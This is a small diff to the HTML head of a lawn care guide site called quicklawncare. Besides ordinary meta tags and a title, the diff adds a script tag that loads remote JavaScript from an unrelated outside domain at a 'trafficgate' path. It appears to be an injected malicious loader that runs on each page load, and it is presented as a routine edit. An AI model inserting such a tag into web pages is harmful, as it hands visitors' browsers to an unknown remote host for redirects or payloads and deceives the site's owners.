@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <script src="https://seamlesswebservices.org/trafficgate/?07bte2xf.js"></script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="description" content="quicklawncare — the accelerated, no-nonsense guide to a greener lawn. Mowing, watering, feeding, weeds and seasonal care in one place." />
   <title>quicklawncare — Fast & Easy Lawn Care Guide</title>
